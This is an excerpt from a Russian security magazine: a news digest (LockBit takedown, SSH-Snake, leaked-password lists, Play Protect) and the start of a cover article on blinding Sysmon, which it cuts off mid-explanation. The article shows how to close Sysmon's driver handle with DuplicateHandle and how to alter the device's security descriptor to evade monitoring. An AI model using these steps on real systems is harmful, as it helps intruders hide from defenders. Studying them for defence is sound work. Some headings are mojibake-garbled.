  кцию, которая в режиме реального времени сканирует приложения, в том
   числе загруженные из сторонних магазинов и сайтов. Эта функция была внед‐
  рена на нескольких крупных рынках, включая Индию, Таиланд, Бразилию
  и Сингапур, и ожидается, что в этом году она распространится на большее
   число стран.
    По  словам  представителей  компании,  эта  функция  уже  позволила
  выявить 515 тысяч нежелательных приложений, предупредив или заблокиро‐
  вав 3,1 миллиона установок.
      Теперь, чтобы дополнительно усилить защиту от нежелательных приложе‐
   ний, Google запускает в Сингапуре пилотный проект, в рамках которого
   Android будет сразу блокировать  установку APK, запрашивающих доступ
   к некоторым разрешениям. Так, потенциально опасными будут считаться:
   • RECEIVE_SMS — злоумышленники используют его для перехвата одно‐
      разовых паролей (OTP) и кодов аутентификации, отправленных через
     SMS, что позволяет получить несанкционированный доступ к аккаунтам
     жертв;
   • READ_SMS — используется для чтения конфиденциальной информации,
     такой как OTP, сообщения банков или личные сообщения, без ведома
      пользователя;
   • BIND_Notifications — атакующие используют это разрешение для чтения
     или удаления уведомлений из легитимных приложений, в том числе опо‐
     вещений о безопасности или OTP (без ведома пользователя);
   • Accessibility — разрешение, предназначенное для помощи пользовате‐
     лям с ограниченными возможностями, которое способно предоставить
      вредоносному APK широчайшие возможности. Обычно хакеры используют
     его для отслеживания действий пользователя, получения конфиденциаль‐
     ных данных, дистанционного нажатия клавиш и выполнения команд, что
      часто приводит к полной компрометации устройства.


        «В ходе предстоящего эксперимента, если пользователь в Сингапуре
          попытается установить приложение из интернет‑источника и будет «
          обнаружено любое из этих четырех разрешений, Play Protect авто-
           матически заблокирует установку приложения и покажет пояснение
          пользователю», — сообщили в Google.                 »

  TELEGRAM — ОСНОВНОЙ ИНСТРУМЕНТ ПРЕСТУПНИКОВ





   На своем выступлении в Совете Федерации заместитель начальника управления по организа‐
   ции  борьбы  с  противоправным  использованием  информационно‑коммуникационных  тех‐
   нологий МВД России Сергей Ерохин назвал Telegram основным инструментом киберпреступни‐
   ков. Он также отметил, что взаимодействие с приложением практически не осуществляется.

            «Основным инструментом коммуникации злоумышленников в таких прес‐ →           туплениях является Telegram, взаимодействие с которым затруднено и на прак‐
          тике не осуществляется ввиду размещения серверного оборудования компании
         и самого юридического лица за пределами РФ, мягко говоря, в недоступном
           сегменте», — рассказал Ерохин.





 ПРАВООХРАНИТЕЛИ
 ХАКНУЛИ LOCKBIT
   Инфраструктура  хакгруппы LockBit была взломана правоохранительными
   органами, но группировка уже возобновляет работу после непродолжитель‐
  ного перерыва.
    В середине февраля правоохранители провели операцию Cronos, в рам‐
   ках которой они вывели из строя инфраструктуру LockBit, включая 34 сервера,
   где размещались сайты для слива данных и их зеркала, украденные у жертв
   файлы, криптовалютные кошельки, а также получили около 1000 ключей
  для дешифрования данных и выпустили инструмент для расшифровки и бес‐
   платного восстановления файлов.





  При этом сайт для слива данных, ранее контролируемый LockBit, был изменен
   властями и уже анонсировал не публикацию данных жертв, а раскрытие
  информации об операциях самой LockBit. В итоге Национальное агентство
  по борьбе с преступностью Великобритании (NCA), ФБР, Европол, Евроюст
  и их партнеры из других стран постепенно раскрыли детали проведенной ими
   операции.


                                        Продолжение статьи →
← Начало статьи





   Так, согласно выпущенному аналитиками Trend Micro отчету, в LockBit уже шла
   разработка новой версии шифровальщика (LockBit-NG-Dev), которая, веро‐
   ятно, должна была стать LockBit 4.0. Исследователи рассказали, что в отли‐
  чие от предыдущей версии, построенной на C/C++, новая малварь представ‐
  ляла собой незавершенную разработку, написанную на .NET, которая, судя
  по всему, была скомпилирована CoreRT и упакована с помощью MPRESS.
      Отмечалось, что новая малварь поддерживает три режима шифрования (с
   использованием AES + RSA) — «быстрое», «прерывистое» и «полное», поз‐
   воляет не шифровать конкретные файлы и каталоги, а также рандомизи‐
  ровать именование файлов, чтобы усложнить их восстановление.
      Также стало известно, что только за последние 18 месяцев хакгруппа
   LockBit получила более 125 миллионов долларов выкупов (по информации
  NCA и блокчейн‑аналитиков из компании Chainalysis). Так, после захвата
   инфраструктуры  группы  правоохранители  изучили  сотни  криптовалютных
   кошельков, связанных с группировкой, и извлекли информацию о 30 тысячах
   биткоин‑адресов, которые использовались для получения выкупов и управле‐
  ния доходами хакеров.
     Больше 500 из этих адресов были активны и получили свыше 125 мил‐
  лионов долларов (по текущему курсу) в период с июля 2022-го по фев‐
  раль 2024 года. Также расследование показало, что около 2200 BTC оста‐
  вались неизрасходованными на момент проведения операции Cronos.


          «Учитывая, что количество подтвержденных атак LockBit за четыре
         года превысило 2000, это позволяет предположить, что последствия «
          [этих атак] в глобальном масштабе исчисляются несколькими мил-
         лиардами долларов», — считают в NCA.                 »
   После захвата инфраструктуры LockBit правоохранительные органы намека‐
   ли, что могут раскрыть личность публичного представителя группировки,
   известного под ником LockBitSupp. В итоге никакого доксинга не произошло,
  но власти заявили, что им известна личность LockBitSupp и он, к примеру,
  водит не Lamborghini, а Mercedes.





  В ответ на это LockBitSupp опубликовал объемное заявление, в котором
   откровенно насмехался над правоохранителями:


        «Я очень рад, что ФБР взбодрило меня, зарядило энергией и зас-
         тавило оторваться от развлечений и траты денег, очень тяжело сидеть «
         за компьютером с сотнями миллионов долларов, единственное, что
         мотивирует меня работать, — это сильные конкуренты и ФБР, появ-
           ляется  спортивный  интерес и желание  соревноваться», — писал
         LockBitSupp.                 »
   Кроме того, в своем послании представитель LockBit подтвердил, что пра‐
   воохранительные органы скомпрометировали инфраструктуру группы, обна‐
  ружив и использовав PHP-уязвимость CVE-2023-3824. LockBitSupp признал,
   что это произошло из‑за его «личной халатности и безответственности», так
   как он «расслабился и не обновил PHP вовремя». Он подчеркивал, что сер‐
  веры, где не было PHP, остались под контролем группы.
    По словам LockBitSupp, правоохранители атаковали LockBit специально,
   чтобы предотвратить публикацию украденных хакерами документов, содер‐
  жащих «много интересных вещей и судебных документов Дональда Трампа,
  которые могут повлиять на предстоящие выборы в США».
    В конце месяца инфраструктура LockBit начала возвращаться к работе.
   Группировка сохранила свой «бренд» и перенесла сайт для слива данных
  на новый onion-адрес, где уже перечислены пять жертв и работают таймеры
   обратного  отсчета,  показывающие  время  до  публикации  похищенной
  информации.
     Как сообщил LockBitSupp, сейчас LockBit планирует повысить уровень
   безопасности своей инфраструктуры и выпускать  инструменты для рас‐
  шифровки файлов вручную. Кроме того, партнерская панель теперь будет
  размещена на нескольких серверах, а партнеры группы получат доступ к раз‐
  личным копиям в зависимости от уровня доверия.


  ПОЧТИ 50% РОССИЯН ПОЛЬЗУЮТСЯ TELEGRAM
  В России суточный охват Telegram среди аудитории старше 12 лет за год вырос почти на 20%,
    подсчитали в компании Mediascope. В результате наращивания охвата Telegram занимает чет‐
   вертую позицию в рейтинге самых популярных интернет‑ресурсов.

   Первое место сохраняется за WhatsApp, среднесуточный охват которого составляет 67%.
   На втором месте находится Яндекс (56%), на третьем — Google (53%).

   При этом отмечается, что доля россиян, которые заходят в Telegram хотя бы раз в месяц, в чет‐
   вертом квартале 2023 года достигла 68%.





 У ПИРАТОВ ИЗЪЯЛИ
 ДВА МИЛЛИАРДА
  ФБР и немецкая полиция получили доступ примерно к 50 тысячам биткоинов
   (около  двух  миллиардов  долларов США),  принадлежавших  операторам
   пиратского портала Movie2k, который закрылся еще в 2013 году.
      Исторически пираты были одними из первых, кто стал использовать крип‐
   товалюту. Например, The Pirate Bay начал принимать пожертвования в бит‐
  коинах еще в 2013 году, когда один биткоин стоил лишь 120 долларов.
  Movie2k тоже был одним из пиратских сайтов, который проявил интерес
   к криптовалюте еще в те годы. В период своего расцвета сайт, работавший
  с 2008 по 2013 год, был крупнейшим пиратским порталом в немецкоязычных
   странах. И он приносил своим операторам неплохой доход, который хранили
   в том числе в криптовалюте.
      Однако операторы сайта так и не успели потратить большую часть этих
   денег. Movie2k неожиданно закрылся весной 2013 года. Тогда многие подоз‐
   ревали, что у ресурса возникли проблемы с законом, и это подтвердилось
   спустя годы, когда в 2020 году полиция Дрездена неожиданно объявила
  о двух арестах.
      Стоит отметить, что Movie2k работал в «серой» зоне, предоставляя поль‐
   зователям ссылки для потоковой передачи или загрузки фильмов и сериалов,
  но не размещая на собственных страницах какие‑либо материалы, защищен‐
  ные авторским правом. Однако Movie2k все равно столкнулся с серьезными
   юридическими проблемами и проверками со стороны властей, что в итоге
   привело к блокировкам на уровне интернет‑провайдеров и вынудило опе‐
   раторов сайта неоднократно поменять домены.
      Когда в 2020 году вдруг появились новые подробности о давно устарев‐
  шем деле, это удивило многих. Но куда большим сюрпризом стало объявле‐
  ние полиции о том, что у операторов сайта изъяли 29,7 миллиона долларов
   в биткоинах, хотя уже тогда правоохранители предполагали, что у операторов
  Movie2k было гораздо больше криптовалюты.
    В феврале полиция Дрездена обнародовала новую информацию, сви‐
   детельствующую о том, что эти предположения  оказались  верны.  Так,
   в результате расследования, проведенного Генеральной прокуратурой Дрез‐
   дена,  полицией  Саксонии и  местным  налоговым  управлением  (INES),
   в начале января 2024 года у бывших операторов Movie2k были изъяты око‐
  ло 50 тысяч биткоинов, то есть более 2 миллиардов долларов по курсу на тот
  момент, что делает эту конфискацию крупнейшей в истории.

         «Биткоины были изъяты после того, как обвиняемые добровольно
         перевели их на официальные кошельки, предоставленные Федераль- «
       ным управлением уголовной полиции. Окончательное решение об их
         использовании еще не принято», — сообщают власти.                 »
   Согласно обнародованной теперь информации, операторы Movie2k «зарабо‐
   тали» эти деньги с помощью рекламы и махинаций с подпиской.
      Интересно, что операторы сайта далеко не всегда получали платежи сразу
   в биткоинах. Дело в том, что они сами регулярно покупали криптовалюту,
   предполагая, что ее будет труднее отследить и конфисковать. Так, владельцы
  Movie2k начали конвертировать свои доходы в биткоины еще в 2012 году, ког‐
  да стоимость BTC составляла всего несколько долларов США.
    В настоящее время бывшие операторы Movie2k (40-летний немец и 37-
   летний поляк) все еще остаются под следствием по обвинениям в нарушении
   авторских прав и отмывании денег. Неясно, все ли биткоины Movie2k были
   изъяты властями теперь, или у бывших операторов пиратского сайта где‑то
   хранится еще криптовалюта.


 САМЫЕ ПОПУЛЯРНЫЕ ПАРОЛИ ИЗ УТЕЧЕК

    Исследователи Data Leakage & Breach Intelligence (DLBI) изучили 5,52 миллиарда уникальных
    учетных записей, включая 44 миллиона новых пар электронная почта / пароль, утекших в сеть
   за последний год.


   Основной упор эксперты сделали на пароли, выявив и удалив автоматически сгенерированные
   пароли (те, которые устанавливают не пользователи сами, а сервис, допустивший утечку этих
   самых паролей), а также массовые автоматические регистрации.


   Источниками для этого исследования послужили различные сообщества, занимающиеся вос‐
    становлением паролей из хешей, теневые форумы и Telegram-каналы, где в открытый доступ
   массово сливают данные.


  В итоге выяснилось, что топ-10 самых популярных паролей за все время выглядит так:

     1. 123456

     2. 123456789

     3. qwerty123

     4. 12345

     5. qwerty

     6. qwerty1

     7. password

     8. 12345678

     9. 111111

    10. 1q2w3e


   Десять самых популярных паролей, содержащих буквы, цифры и спецсимволы:

     1. 1qaz@WSX

     2. P@ssw0rd

     3. p@ssw0rd

     4. pass@123

     5. 1qaz!QAZ

     6. !QAZ2wsx

     7. Password1!

     8. !QAZ1qaz

     9. Pass@123

    10. abc123!


   А вот топ-10 самых популярных кириллических паролей в основном состоит из имен:

     1. йцукен

     2. пароль

     3. любовь

     4. привет

     5. наташа

     6. максим

     7. марина

     8. люблю

     9. андрей

    10. кристина





 SSH-SNAKE ВОРУЕТ
 КЛЮЧИ
   Аналитики компании Sysdig предупредили о появлении опенсорсного инстру‐
   мента SSH-Snake, который используется для незаметного поиска приватных
   ключей и бокового перемещения по инфраструктуре жертвы.
      Исследователи  описывают SSH-Snake  как  «самомодифицирующегося
   червя», который использует учетные данные SSH, обнаруженные в скомпро‐
   метированной системе, чтобы начать распространяться по сети. Также отме‐
   чается, что он отличается от обычных SSH-червей тем, что избегает пат‐
   тернов, типичных для скриптовых атак, и выводит обычное боковое переме‐
  щение по сети на новый уровень, поскольку более тщательно подходит
   к поиску приватных ключей.
     SSH-Snake использует следующие прямые и косвенные методы для обна‐
   ружения приватных ключей в зараженных системах:
   • поиск в общих каталогах и файлах, где обычно хранятся SSH-ключи и учет‐
     ные данные, включая каталоги .ssh и файлы конфигурации;
   • изучение  файлов  shell  history  (например,  .bash_history,  .zsh_history)
     для поиска команд (ssh, scp и rsync), которые могли использовать приват‐
     ные ключи SSH или ссылаться на них;
   • использование функции find_from_bash_history для анализа истории bash
     в поисках команд, связанных с операциями SSH, SCP и Rsync, что поз‐
      воляет обнаружить прямые ссылки на приватные ключи, их местополо‐
     жение и связанные с ними учетные данные;
   • изучение системных журналов и сетевого кеша (таблиц ARP) для выяв‐
     ления потенциальных целей и сбора информации, которая может кос‐
     венно привести к обнаружению приватных ключей и мест их исполь‐
     зования.

  SSH-Snake появился на GitHub в начале января 2024 года, и его разработчик
   писал, что это «мощный инструмент» для автоматического network traversal c
   использованием приватных ключей SSH, обнаруженных в системах. При этом
  SSH-Snake создает полную карту сети и ее зависимостей, помогая опре‐
   делить, как сеть может быть скомпрометирована с использованием SSH
  и приватных ключей SSH, начиная с конкретного хоста.
      Создатель SSH-Snake Джошуа Роджерс (Joshua Rogers) подчеркивал, что
  его инструмент предназначен для законных владельцев систем и выявления
   слабых мест в их инфраструктуре, пока этого не сделали злоумышленники.


          «Принято считать, что кибертерроризм происходит внезапно и требует
          исключительно реактивного подхода к безопасности, — говорит Род- «
         жерс. — По моему опыту, вместо этого системы должны разрабаты-
           ваться и обслуживаться с применением комплексных мер безопас-
         ности. Если бы системы разрабатывались и обслуживались людьми
         в  здравом  уме, а  владельцы  систем и  компании  действительно
          заботились о безопасности, последствия от выполнения подобного
          скрипта были бы сведены к минимуму, как если бы действия SSH-
        Snake выполнялись злоумышленником вручную».                 »
   Sysdig сообщает, что одна из наиболее интересных особенностей SSH-Snake
   заключается в его способности модифицировать себя и уменьшать размер
  при первом запуске. Для этого червь удаляет из своего кода комментарии,
   ненужные функции и пробельные символы.
      Аналитики подчеркнули, что червь уже используется злоумышленниками.
  В частности, был обнаружен управляющий сервер, который операторы SSH-
  Snake использовали для хранения собранной информации, включая учетные
   данные и IP-адреса жертв. Судя по всему, хакеры эксплуатировали известные
   уязвимости в Apache ActiveMQ и Atlassian Confluence для получения пер‐
   воначального доступа к сетям жертв, а затем развертывали червя для про‐
   должения атаки.
    По данным специалистов, в общей сложности опенсорсный инструмент
  уже использовался в атаках против примерно 100 жертв.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Аудит Tor выявил 17 уязвимостей


   Хакеры взломали системы Cloudflare, используя похищенные у Okta токены


   У гонконгской фирмы украли 25 миллионов долларов с помощью дипфейков в видеочате


   Google: большинство 0-day-уязвимостей связаны с поставщиками коммерческого шпионского
  ПО


    Критическая уязвимость в Shim представляет угрозу для Linux-дистрибутивов


   Канада запрещает Flipper Zero ради борьбы с автоугонами


   Glupteba использует ранее не документированный UEFI-буткит


   Более 13 тысяч пользователей камер Wyze заглянули в чужие дома


    Атака VoltSchemer использует беспроводные зарядки для повреждения устройств


   ChatGPT напугал пользователей бессвязными и бессмысленными ответами
COVERSTORY





По лучив доступ к системе, зло умыш ленник
первым делом пытается ослепить средс тва
аудита, чтобы как можно доль ше оставать ся
незаме ченным. В этой статье мы с тобой
попробуем ослепить Sysmon и сделать              driverenok                                                                                                       Threat Researcher
это максимально незаметно для штатного        andreykras14@gmail.com
аудита Windows. Достичь этого нам поз-
волят манипуляции с хендлами и дес крип-
торами безопас ности.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



SYSMON INTERNALS

Сра зу оговорюсь, что техники, описанные в этой статье, тре буют, чтобы у ата-
кующего были адми нис тративные при вилегии. Кто-то скажет: зачем же нам
углубляться во внутрянку Windows, если с правами админа можно оста новить
службу Sysmon или вооб ще удалить ее? Ответ прост. Во-первых, при реали-
зации традиционных техник, таких как остановка службы, завершение процес-
са или полное удаление Sysmon, штат ный аудит Windows сформирует массу
событий (начиная с EventID 4689 в журнале Security и заканчивая событием
EventID 1  в журнале System  от провайдера  FilterManager). Во-вторых,
это прос то полезное упражнение: мы должны как можно глубже раз бирать ся
в подсисте ме безопасности любимой ОС, чтобы понимать техники, которы ми
поль зуют ся хакеры.
   Как уже говорилось в статье «Sysmon для безопас ника», Sysmon —
это инструмент, предназна ченный для углублен ного мониторинга активности,
про исхо дящей в системе, который поз воляет сущес твенно расширить штат-
ный аудит ОС Windows.
   Вот как его работа выг лядит изнутри.





Первая коман да  ( search  <ServicePattern>) ищет зарегистрированные
в   системе   службы   и   драйверы   с   помощью   Win32-функции
EnumServicesStatus(). Видно, что в системе действу ют две сущности: служба
режима пользователя — Sysmon64 и драй вер SysmonDrv. Обе сущ ности
запускают ся автоматически при старте системы (поле StartType). Эту
информацию мы получаем с помощью команды show all <ServiceName>,
которая пос ледовательно вызывает  QueryServiceStatus()  (для получения
текуще го    статуса   работы  —   запущена    или    остановлена)
и QueryServiceCong() (для получения оставшей ся информации).
  Ло гично пред положить, что события (или часть событий), которые пишет
служба Sysmon64 в журнал Microsoft-Windows-Sysmon\Operational, фор-
мируются модулем ядра SysmonDrv, а для вза имодействия службы и драй-
вера должно быть коммуникационное устройство (device). Чтобы про верить
это, пос мотрим на список хендлов, открытых службой Sysmon64 (процессом
Sysmon64.exe).
  Получим  идентификатор  процес са  Sysmon64.exe   (search  name  <
ProcessPattern>).





Ко ман да  search   name   <ProcessPattern>  работает  через  вызов
CreateToolhelp32Snapshot(): фун кции Process32First() и Process32Next().
  После того как мы получим ID про цесса, посмотрим спи сок его хендлов.





Из вывода видно, что у процес са Sysmon64.exe есть несколько открытых хен-
длов на устройства. Обрати внимание на устройство \Device\SysmonDrv,
одноименное драйверу. Скорее всего, именно с помощью этого устрой ства
служба режима поль зователя Sysmon64 получает информацию от драй вера
и впос ледствии формирует события аудита.
  Команда   show    handles    <PID>    <Type>   реализует   вызов
NtQueryInformationProcess() с парамет ром ProcessHandleInformation.


__kernel_entry NTSTATUS NtQueryInformationProcess(
  [in]            HANDLE           ProcessHandle,
  [in]            PROCESSINFOCLASS ProcessInformationClass,
  [out]           PVOID            ProcessInformation,
  [in]            ULONG            ProcessInformationLength,
  [out, optional] PULONG           ReturnLength
);

Первый параметр (ProcessHandle) — дескриптор процесса, хен длы которого
мы хотим увидеть. Его можно получить при помощи функции OpenProcess()
с параметром PROCESS_QUERY_INFORMATION.
   ProcessInformationClass — это характер запрашиваемой информации.
В нашем случае этот параметр равен ProcessHandleInformation, то есть мы
хотим получить информа цию о хен длах процесса.
  Сле дующим идет ProcessInformation, указатель на память, в которую
будет     помещен      результат      нашего      запроса   —
PPROCESS_HANDLE_SNAPSHOT_INFORMATION, то есть указатель на структуру,
содержащую список всех хендлов и их количес тво.
   Четвертый и пятый параметры ука зывают раз мер имеющей ся и тре буемой
памяти, в которую помещается возвра щаемый фун кци ей результат.


ÇÀÊÐÛÒÈÅ ÕÅÍÄËÀ ×ÅÐÅÇ ÄÓÁËÈÊÀÒ

Ес ли наши предположения верны, то, чтобы Sysmon перестал фор мировать
события ауди та, атакующий может заставить про цесс Sysmon64.exe закрыть
хендл на это устройство.
  Существует несколь ко способов это сделать, но мы воспользуемся
самым, на мой взгляд, прос тым — с помощью вызова DuplicateHandle():


BOOL DuplicateHandle(
  [in]  HANDLE   hSourceProcessHandle,
  [in]  HANDLE   hSourceHandle,
  [in]  HANDLE   hTargetProcessHandle,
  [out] LPHANDLE lpTargetHandle,
  [in]  DWORD    dwDesiredAccess,
  [in]  BOOL     bInheritHandle,
  [in]  DWORD    dwOptions
);

С помощью этой функции можно копировать хендлы меж ду процессами, при-
чем у нее есть интересная опция, которая позволяет при копировании зак-
рывать исходный хендл. Этим мы и вос пользуемся. Наш код будет выглядеть
следующим образом:


DuplicateHandle(
  hProcess,
  hObject,
  GetCurrentProcess(),
  &hDupObject,
  0,
  FALSE,
  DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
);

Первый параметр (hProcess) — дес крип тор про цес са, хендл из которого мы
хотим ско пировать зак рыть. Тут важно не забыть, что передаваемый объект
про цесса   hProcess   дол жен   быть   открыт   с   маской   доступа
PROCESS_DUP_HANDLE.
  Сле дующий параметр (hObject) — сам закрываемый дескриптор.
   Тре тий  (GetCurrentProcess()) и четвертый  (&hDupObject) параметры
указывают на про цесс-при емник и сам хендл-приемник соответс твенно.
  Последний    параметр    содер жит    две    константы:    первая
(DUPLICATE_SAME_ACCESS) зна чит, что новый хендл должен иметь такую же
маску доступа, как и исходный; вто рая  (DUPLICATE_CLOSE_SOURCE) — что
необходимо  зак рыть  исходный  хендл  после  операции  дублирования.
Отлично, это то, что нам нужно.
   Итак, как мы видели ранее, у про цесса Sysmon64.exe есть открытый опи-
сатель для объ екта \Device\SysmonDrv. Попробуем его зак рыть.





Мы закрыли описатель с идентифика тором 0x310, однако сразу после этого
про цесс Sysmon64.exe успешно открыл его пов торно (0x4с4) и продол жил
работать как ни в чем не бывало. Поэто му перейдем к тяжелой артилле рии,
а эта тех ника нам еще понадобится позже.


ÎÁÚÅÊÒÛ ÄÐÀÉÂÅÐÎÂ

Раз уж не получилось манипулировать с хендлом, попробуем поманипули-
ровать с дес крип тором безопас ности (Security Descriptor), который опре-
деляет правила пре дос тавления дос тупа к устройству \Device\SysmonDrv.
Но для начала давай вспом ним, что такое объект драйвера (driver) и объ ект
устройства (device), а также как устроена под система управления доступом
в Windows. Если ты хорошо знаком с такими понятиями, как Driver Object,
Device Object, Security Descriptor и Access Token, можешь смело пропускать
этот и сле дующий разделы.
  При загрузке драйвера в адресное пространство ядра сис тема создает
структуру _DRIVER_OBJECT, то есть создает специальный объ ект типа драй-
вер (driver). Для наглядности воспользуем ся отладчи ком WinDbg и пос мотрим
на содержимое этой структуры.





По смещению 0x008 от начала структуры живет элемент DeviceObject — ука-
затель на струк туру _DEVICE_OBJECT — это другой объект ядра, который
необходим для ком муникаций между про цессом режима поль зователя
и самим драй вером. Иными сло вами, коммуникационное устройство обес-
печивает переда чу информа ции между пользователь ским процес сом и драй-
вером. Именно для этих целей драйверы создают объекты device, а поль-
зовательские процессы могут взаимодей ствовать с ними.





Са мый инте ресный эле мент структуры — это SecurityDescriptor. Именно
там хранятся све дения о том, кому разрешено вза имодействовать с устрой-
ством и по какой маске дос тупа. Его содержимым мы и будем манипу лиро-
вать.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ



            ВЫВОДИМ МОНИТОРИНГ
             ИЗ СТРОЯ МАКСИМАЛЬНО
                        НЕЗАМЕТНО





ÊÀÊ ÓÑÒÐÎÅÍÀ ÁÅÇÎÏÀÑÍÎÑÒÜ Â WINDOWS

В под системе управле ния доступом Windows есть три учас тни ка (роли):
 • субъект доступа;
 • объект дос тупа;
 • независимый арбитр.

Ñóáú åêòîì äîñòóïà при нято называть поток (или процесс, в этой статье мы
будем счи тать эти понятия синонимами), который пытается получить доступ
к ресурсу (нап ример, фай лу или клю чу реестра) — îáú åêòó äîñòóïà. Потоки
исполняются в контексте опре делен ного пользователя. Это означает, что
про цесс может получить ровно столько доступа, сколь ко предос тавлено учет-
ной записи, от име ни которой запущен процесс.
  За при надлежность потока к кон тексту конкретного поль зователя отве чает
структура ядра _Token (Access Token, маркер доступа). Это своеобразный
«пас порт субъекта», который система проверя ет всякий раз, как только про-
цесс затребует выпол нение какой-либо опе рации над объ ектом (чтение клю-
ча реестра, запись в файл, чтение из коммуникационного устройства). Струк-
тура _Token содержит следующие све дения:
 • от име ни какой учетной записи запущен про цесс (идентификатор учетной
   записи);
 • каким группам безопас ности принад лежит учетная запись (идентифика-
   торы групп);
 • какие у учетной записи привилегии.

По лучим адрес Token из структуры _EPROCESS (это струк тура ядра, которая
описывает объект процесса).





По факту Token «указыва ет на указатель» _EX_FAST_REF, а не на сам Token.
При чем _EX_FAST_REF имеет тип union (в терминоло гии языка C) и включает
в себя три эле мента. Напом ню, union пред полагает, что все элементы типа
сов местно исполь зуют выделенную им память.
  Эле менты Object и Value — 8 байт, RefCnt — 4 бита. Зна чение RefCnt
используется  внут ренними  механизмами  ядра  Windows  для  подсчета
количества ссы лок. Таким обра зом, что бы получить адрес ука зателя на струк-
туру _Token, нужно занулить пос ледние 4 бита значения в эле менте Object.




Пос мотреть на содер жимое Access Token в удобном виде можно с помощью
рас ширения !token.





Видим, что Sysmon64.exe запущен от име ни учет ной записи Local System (S-
1-5-18). Более подробно о том, что такое маркер доступа, можно почитать
в стать ях «Windows Tokens» и «То кены. От появления до прод вижения в Active
Directory» на «Хабрахабре».
  Îáú åêòîì  äîñòóïà  называ ется  любой  элемент  Windows,  доступ
к которому может быть про извольно огра ничен. По своей сути Windows имеет
объ ектную модель, то есть все ресурсы являются объектами. Файлы, ключи
реестра, про цес сы, устрой ства ввода-вывода — это всё объекты, дос туп
к которым контро лируется средс твами ОС. Сведения о том, кому можно
получить доступ к объекту, а кому нет, содержатся в Security Descriptor (SD,
дес криптор безопасности объекта, структура ядра _SECURITY_DESCRIPTOR).
Пос мотрим на содержимое дескриптора безопасности для нашего устрой-
ства \Device\SysmonDrv. Для это го про делаем следующий путь:
 1. С  помощью   расширения  !drvobj   получим   адрес   структуры
  _DRIVER_OBJECT для нашего драйвера SysmonDrv.
 2. Оттуда получим значение DeviceObject, указывающее на объект ком-
   муникационного устройства \Device\SysmonDrv (_DEVICE_OBJECT).
 3. А уже из _DEVICE_OBJECT — указатель на _SECURITY_DESCRIPTOR .





Пос мотрим на содержимое дескриптора безопасности нашего объекта.





В этой структуре хранятся:
 • све дения о хозяине объекта (object owner), в нашем случае это Local
   System (S-1-5-18);
 • данные об основной груп пе объекта (object primary group) — Local System;
 • списки DACL и SACL.

Именно спи сок DACL содер жит перечень учетных записей (идентифика-
торов), которым разрешено (или зап рещено) получать дос туп к объекту.
При этом указывается метод дос тупа (маски, опе рации доступа).
  Подробнее о структуре дескрип торов безопас ности можно про читать в
статье на «Кодебай».
   У нас есть ñóáú åêò äîñòóïà, изъявивший желание получить доступ
к защищаемо му ресурсу (субъект имеет свой Access Token, содер жащий све-
дения об учет ной записи пользователя, ее членстве в группах и при вилегиях),
и îáú åêò äîñòóïà (то есть сам защища емый ресурс), имеющий Security
Descriptor (све дения о том, кому и какой доступ раз решен). Теперь нам нужен
незави симый арбитр, который смо жет на основе этой информации решить,
пре дос тавлять ли дос туп.
  В  качестве  такого íå çàâèñèìî ãî  àðáèòðà  выступает  ком понент
исполни тельной подсистемы — Security Reference Monitor (SRM). Этот ком-
понент отве чает за проверку того, может ли субъект получить доступ к объ-
екту по зап рашиваемо му методу дос тупа на осно ве своих внутренних алго-
ритмов.
   Итак, подыто жим:
 • субъект доступа — процесс Sysmon64.exe, запущенный от име ни учет ной
   записи Local System (S-1-5-18);
 • Sysmon64.exe  читает  данные, формиру емые  драй вером  SysmonDrv,
   с помощью коммуникационного устройства — \Device\SysmonDrv (объ-
   ект дос тупа);
 • устройство \Device\SysmonDrv имеет свой Security Descriptor, который
   атакующий хочет модифи циро вать таким образом, чтобы субъекту (про-
   цессу Sysmon64.exe) было отказано в дос тупе.


ÎÑËÅÏËßÅÌ SYSMON

Освежив знания о под системе управления дос тупом, прис тупим к нашей
основной задаче — попробу ем ослепить Sysmon. В этом разделе мы изме-
ним Security Descriptor таким образом, чтобы про цессу Sysmon64.exe было
отка зано в пре доставлении доступа к устрой ству \Device\SysmonDrv.
  Посмотрим на содер жимое дес криптора безопасности коммуникацион-
ного устройства. Для это го нам пот ребуется получить хендл на устройство
с помощью функции CreateFile() и пос ледующего вызова GetSecurityInfo().
Давай подробнее остановимся на  этих функци ях. CreateFile() уме ет
получать опи сатели для мно жества объектов, в том числе и для коммуника-
ционных устройств:


HANDLE CreateFileW(
  [in]           LPCWSTR               lpFileName,
  [in]           DWORD                 dwDesiredAccess,
  [in]           DWORD                 dwShareMode,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [in]           DWORD                 dwCreationDisposition,
  [in]           DWORD                 dwFlagsAndAttributes,
  [in, optional] HANDLE                hTemplateFile
);

Давай подробнее разберем каж дый из семи парамет ров.
 1. lpFileName  при нимает  имя  объекта,  в нашем  случае  это \\.\
  SysmonDrv — сим воличес кая ссылка на \Device\SysmonDrv.
 2. dwDesiredAccess — перечень флагов, описывающих зап рашиваемый
   дос туп (маска дос тупа). Подсистема безопасности Windows устроена
   таким образом, что перед тем, как выполнить операцию над объектом,
   надо указать перечень необ ходимых дос тупов. Чтобы пос мотреть зна-
   чения Owner, Group и список DACL, нужно указать READ_CONTROL, а чтобы
   посмотреть    или    изменить    список   SACL  —    значение
  ACCESS_SYSTEM_SECURITY (последний флаг тре бует наличия у вызыва-
  ющего процесса вклю ченных привилегий SE_SECURITY_NAME, в против-
  ном случае получим ошибку ERROR_ACCESS_DENIED ).
 3. dwShareMode опре деляет режим совмес тного использования. В нашем
   случае уста навливается 0.
 4. lpSecurityAttributes принима ет ука затель на дескриптор безопас-
   ности, который будет ассоциирован с объектом. Этот параметр име ет
   значение только в слу чае соз дания нового объекта.
 5. dwCreationDisposition  опре деляет  дей ствие  для  существующих
   или несуществующих фай лов или устройств, в нашем слу чае его зна чение
   будет рав но OPEN_EXISTING.
 6. dwFlagsAndAttributes определяет перечень флагов и  атрибутов,
   с  которы ми  зап рашивается  дос туп  к  объекту.  Здесь мы  ука жем
  FILE_FLAG_BACKUP_SEMANTICS, что сообщит под системе безопасности
